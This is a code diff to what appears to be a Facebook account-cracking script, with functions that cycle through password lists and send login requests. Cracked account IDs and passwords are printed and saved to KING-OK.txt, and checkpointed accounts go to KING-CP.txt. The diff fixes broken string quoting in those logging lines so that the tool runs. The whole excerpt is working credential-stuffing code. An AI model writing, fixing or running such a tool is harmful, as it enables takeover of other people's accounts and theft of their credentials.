@@ -469,8 +469,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in KING:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'|'\033[1;97m')
-                                        open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'|'\n')
+                                        print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -534,14 +534,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'|'\033[1;97m')
-                                        open('/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'|'\n')
+                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'|'\033[1;97m')
-                                                open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'|'\n')
+                                                print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -604,18 +604,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'|'\033[1;97m')
-                                        open('/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'|'\n')
+                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'|'\033[1;97m')
-                                                open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'|'\n')
+                                                print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/KING-CP.txt','a').write(ids+'|'+pas+'|'\n')
+                                                open('/sdcard/KING-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -676,13 +676,13 @@ def rndm(ids,passlist):
                                                 okk=open('/sdcard/KING-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [KING-OK] '+uid+' | '+pas+'|'\033[1;97m')
-                                                        open('/sdcard/KING-OK.txt','a').write(uid+'|'+pas+'|'\n')
+                                                        print('\r\r\033[1;32m [KING-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/KING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [KING-OK] '+uid+' | '+pas+'|'\033[1;97m')
-                                                open('/sdcard/KING-OK.txt','a').write(uid+'|'+pas+'|'\n')
+                                                print('\r\r\033[1;32m [KING-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/KING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
